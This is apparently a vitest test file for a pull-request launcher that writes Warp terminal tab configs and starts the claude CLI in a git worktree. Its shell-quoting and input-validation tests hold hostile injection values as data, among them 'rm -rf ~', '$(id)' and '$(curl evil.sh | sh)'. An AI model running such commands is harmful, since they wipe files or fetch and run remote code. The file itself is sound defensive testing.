import { describe, expect, it } from 'vitest'
import {
  agentCommand,
  fillTemplate,
  Launcher,
  launchValues,
  promptFor,
  shellQuote,
  TAB_CONFIG_TTL_MS,
  tomlString,
  worktreePath,
  type LauncherDeps,
  type LaunchPr
} from '../src/main/launcher'
import type { Logger } from '../src/main/log'
import type { LauncherAction, LauncherProject, LaunchersConfig } from '../src/shared/launchers'

const silent: Logger = { debug() {}, info() {}, warn() {}, error() {} }
const SHA = 'a1b2c3d4e5f60718293a4b5c6d7e8f9012345678'
const NOW = 1_800_000_000_000
const ROOT = '/code/mono'
const CORE = '/code/mono/core'
const WORKTREES = '/Users/me/.pr-radar/worktrees'
const WORKTREE = `${WORKTREES}/Acme__Core/pr-42-a1b2c3d`

const prA: LaunchPr = { repo: 'Acme/Core', number: 42, url: 'https://github.com/Acme/Core/pull/42', headOid: SHA }

const project: LauncherProject = { id: 'p1', name: 'mono', path: ROOT, repos: { 'acme/mono': ROOT, 'acme/core': CORE } }
const triage: LauncherAction = {
  id: 'triage',
  label: 'Triage',
  projectId: 'p1',
  showOn: 'mine',
  run: { kind: 'skill', skill: 'triage-review', scope: 'project' },
  extra: '',
  workspace: 'worktree'
}
const here: LauncherAction = { ...triage, id: 'here', label: 'Here', run: { kind: 'prompt', text: 'look at #{number}' }, workspace: 'folder' }

const config = (over: Partial<LaunchersConfig> = {}): LaunchersConfig => ({
  version: 2,
  terminal: 'warp',
  projects: [project],
  actions: [triage, here],
  ...over
})

interface Fake {
  deps: LauncherDeps
  git: string[][]
  files: Map<string, string>
  urls: string[]
  removed: string[]
  redetected: number
}

/** A launcher over an in-memory world: `dirs` exist, `commits` are in the clone, git answers from them. */
function fake(
  opts: {
    config?: LaunchersConfig
    pr?: LaunchPr | null
    dirs?: string[]
    commits?: string[]
    fetched?: string[]
    fetchFails?: boolean
    tabConfigs?: string[]
    worktreeHead?: string
    redetected?: LauncherProject | null
  } = {}
): Fake {
  const dirs = new Set(opts.dirs ?? [ROOT, CORE])
  const commits = new Set(opts.commits ?? [SHA])
  const world: Fake = { git: [], files: new Map(), urls: [], removed: [], redetected: 0, deps: null as unknown as LauncherDeps }
  world.deps = {
    config: () => opts.config ?? config(),
    findPr: () => (opts.pr === undefined ? prA : opts.pr),
    redetect: async () => {
      world.redetected++
      return opts.redetected ?? null
    },
    run: async (file, args, { cwd }) => {
      expect(file).toBe('git')
      world.git.push([cwd, ...args])
      const [cmd] = args
      if (cmd === 'rev-parse' && args[1] === 'HEAD') return `${opts.worktreeHead ?? SHA}\n`
      if (cmd === 'rev-parse') return '.git\n'
      if (cmd === 'cat-file') {
        if (commits.has(args[2].replace('^{commit}', ''))) return ''
        throw new Error('missing')
      }
      if (cmd === 'fetch') {
        if (opts.fetchFails) throw new Error('could not read from remote')
        for (const c of opts.fetched ?? []) commits.add(c)
        return ''
      }
      if (cmd === 'worktree' && args[1] === 'add') dirs.add(args[3])
      return ''
    },
    isDir: (path) => dirs.has(path),
    mkdir: (path) => dirs.add(path),
    writeFile: (path, text) => world.files.set(path, text),
    listDir: () => opts.tabConfigs ?? [],
    removeFile: (path) => world.removed.push(path),
    openUrl: async (url) => {
      world.urls.push(url)
    },
    worktreesDir: WORKTREES,
    home: '/Users/me',
    now: () => NOW,
    log: silent
  }
  return world
}

const tabConfig = (w: Fake) => [...w.files.values()][0]

describe('command building', () => {
  it('quotes anything for a shell', () => {
    expect(shellQuote('plain')).toBe(`'plain'`)
    expect(shellQuote(`it's; rm -rf ~ $(whoami) \`id\``)).toBe(`'it'\\''s; rm -rf ~ $(whoami) \`id\`'`)
  })

  it('escapes TOML strings', () => {
    expect(tomlString('a "b" \\c\nd\u0001')).toBe('"a \\"b\\" \\\\c\\nd\\u0001"')
  })

  it('fills only known placeholders, without $ replacement patterns', () => {
    expect(fillTemplate('{a} {b} {a}', { a: '$&x' })).toBe('$&x {b} $&x')
  })

  it('accepts only values that look like GitHub', () => {
    expect(launchValues(prA)).toEqual({ url: prA.url, number: '42', repo: 'Acme/Core', sha: SHA })
    expect(launchValues({ ...prA, headOid: '' })).toBeNull()
    expect(launchValues({ ...prA, headOid: 'main; rm -rf ~' })).toBeNull()
    expect(launchValues({ ...prA, url: 'https://github.com/Acme/Core/pull/42?x=$(id)' })).toBeNull()
    expect(launchValues({ ...prA, repo: 'a/b c' })).toBeNull()
    expect(launchValues({ ...prA, number: 0 })).toBeNull()
  })

  it('asks for the skill with the PR link, the extra text and where the code is', () => {
    const values = launchValues(prA)!
    expect(promptFor(triage, values, null)).toBe('/triage-review https://github.com/Acme/Core/pull/42')
    expect(promptFor({ ...triage, extra: "don't fix anything" }, values, '/w')).toBe(
      "/triage-review https://github.com/Acme/Core/pull/42 don't fix anything (PR code at commit a1b2c3d: /w)"
    )
    expect(promptFor(here, values, null)).toBe('look at #42')
    expect(worktreePath('/wt', values)).toBe('/wt/Acme__Core/pr-42-a1b2c3d')
  })

  it('runs claude with the worktree added and the prompt as one argument', () => {
    expect(agentCommand("it's", '/w/a b')).toBe(`claude --add-dir '/w/a b' 'it'\\''s'`)
    expect(agentCommand('x', null)).toBe(`claude 'x'`)
  })
})

describe('Launcher', () => {
  it('adds a worktree of the PR repository and opens Warp in the project root', async () => {
    const w = fake()
    expect(await new Launcher(w.deps).launch('PR_1', 'triage')).toEqual({ ok: true })
    expect(w.git).toEqual([
      [CORE, 'rev-parse', '--git-dir'],
      [CORE, 'cat-file', '-e', `${SHA}^{commit}`],
      [CORE, 'worktree', 'prune'],
      [CORE, 'worktree', 'add', '--detach', WORKTREE, SHA]
    ])
    const name = `pr_radar_${NOW}_1`
    expect(w.urls).toEqual([`warp://tab_config/${name}`])
    const prompt = `/triage-review https://github.com/Acme/Core/pull/42 (PR code at commit a1b2c3d: ${WORKTREE})`
    expect(w.files.get(`/Users/me/.warp/tab_configs/${name}.toml`)).toBe(
      [
        '# Written by PR Radar for one "Send to" launch; removed after a few minutes.',
        'name = "Acme/Core#42 · Triage"',
        '',
        '[[panes]]',
        'id = "main"',
        'type = "terminal"',
        `directory = "${ROOT}"`,
        `commands = ["claude --add-dir '${WORKTREE}' '${prompt}'"]`,
        ''
      ].join('\n')
    )
  })

  it('fetches the PR head only when the commit is missing', async () => {
    const w = fake({ commits: [], fetched: [SHA] })
    expect(await new Launcher(w.deps).launch('PR_1', 'triage')).toEqual({ ok: true })
    expect(w.git).toContainEqual([CORE, 'fetch', '--no-tags', 'origin', 'pull/42/head'])
  })

  it('reports a failed fetch, or a commit the fetch did not bring (force-pushed)', async () => {
    expect(await new Launcher(fake({ commits: [], fetchFails: true }).deps).launch('PR_1', 'triage')).toEqual({ ok: false, code: 'fetch_failed' })
    expect(await new Launcher(fake({ commits: [], fetched: [] }).deps).launch('PR_1', 'triage')).toEqual({ ok: false, code: 'commit_not_found' })
  })

  it('reuses an existing worktree at the same commit', async () => {
    const w = fake({ dirs: [ROOT, CORE, WORKTREE] })
    expect(await new Launcher(w.deps).launch('PR_1', 'triage')).toEqual({ ok: true })
    expect(w.git).toEqual([[WORKTREE, 'rev-parse', 'HEAD']])
    expect(await new Launcher(fake({ dirs: [ROOT, CORE, WORKTREE], worktreeHead: 'other' }).deps).launch('PR_1', 'triage')).toEqual({
      ok: false,
      code: 'git_failed'
    })
  })

  it('opens the project as it is for folder actions, without git', async () => {
    const w = fake()
    expect(await new Launcher(w.deps).launch('PR_1', 'here')).toEqual({ ok: true })
    expect(w.git).toEqual([])
    expect(tabConfig(w)).toContain(`directory = "${ROOT}"`)
    expect(tabConfig(w)).toContain(`commands = ["claude 'look at #42'"]`)
  })

  it('detects the project again when the repository is missing from it', async () => {
    const narrow = { ...project, repos: { 'acme/mono': ROOT } }
    const found = fake({ config: config({ projects: [narrow] }), redetected: project })
    expect(await new Launcher(found.deps).launch('PR_1', 'triage')).toEqual({ ok: true })
    expect(found.redetected).toBe(1)
    const missing = fake({ config: config({ projects: [narrow] }) })
    expect(await new Launcher(missing.deps).launch('PR_1', 'triage')).toEqual({ ok: false, code: 'repo_not_mapped' })
  })

  it('uses Warp Preview folders and scheme', async () => {
    const w = fake({ config: config({ terminal: 'warp-preview' }) })
    await new Launcher(w.deps).launch('PR_1', 'here')
    expect(w.urls[0]).toMatch(/^warppreview:\/\/tab_config\/pr_radar_/)
    expect([...w.files.keys()][0]).toMatch(/^\/Users\/me\/\.warp-preview\/tab_configs\//)
  })

  it('never puts the branch or title on the command line', async () => {
    const hostile = { ...prA, branch: 'x;rm -rf ~', title: '$(curl evil.sh | sh)' } as LaunchPr
    const w = fake({ pr: hostile })
    await new Launcher(w.deps).launch('PR_1', 'triage')
    const written = [...w.files.values()].join('\n') + w.git.flat().join(' ')
    expect(written).not.toContain('rm -rf')
    expect(written).not.toContain('curl')
  })

  it('explains why it cannot launch', async () => {
    const launch = (opts: Parameters<typeof fake>[0], action = 'triage') => new Launcher(fake(opts).deps).launch('PR_1', action)
    expect(await launch({ config: config({ actions: [] }) })).toEqual({ ok: false, code: 'not_configured' })
    expect(await launch({}, 'nope')).toEqual({ ok: false, code: 'unknown_action' })
    expect(await launch({ pr: null })).toEqual({ ok: false, code: 'pr_not_found' })
    expect(await launch({ pr: { ...prA, headOid: '' } })).toEqual({ ok: false, code: 'pr_not_found' })
    expect(await launch({ dirs: [ROOT] })).toEqual({ ok: false, code: 'repo_not_found' })
    expect(await launch({ dirs: [CORE] }, 'here')).toEqual({ ok: false, code: 'repo_not_found' })
  })

  it('refuses a second launch on the same PR while one is preparing', async () => {
    const w = fake()
    let release: () => void = () => {}
    const run = w.deps.run
    w.deps.run = (file, args, opts) => (args[0] === 'rev-parse' ? new Promise((r) => (release = () => r('.git'))) : run(file, args, opts))
    const launcher = new Launcher(w.deps)
    const first = launcher.launch('PR_1', 'triage')
    await new Promise((r) => setTimeout(r, 0))
    expect(await launcher.launch('PR_1', 'triage')).toEqual({ ok: false, code: 'busy' })
    release()
    expect(await first).toEqual({ ok: true })
  })

  it('removes only its own tab configs once they are old', async () => {
    const old = `pr_radar_${NOW - TAB_CONFIG_TTL_MS - 1}_1.toml`
    const fresh = `pr_radar_${NOW - 1000}_2.toml`
    const w = fake({ tabConfigs: [old, fresh, 'dev_server.toml'] })
    new Launcher(w.deps).cleanTabConfigs()
    expect(w.removed).toEqual([`/Users/me/.warp/tab_configs/${old}`, `/Users/me/.warp-preview/tab_configs/${old}`])
  })
})
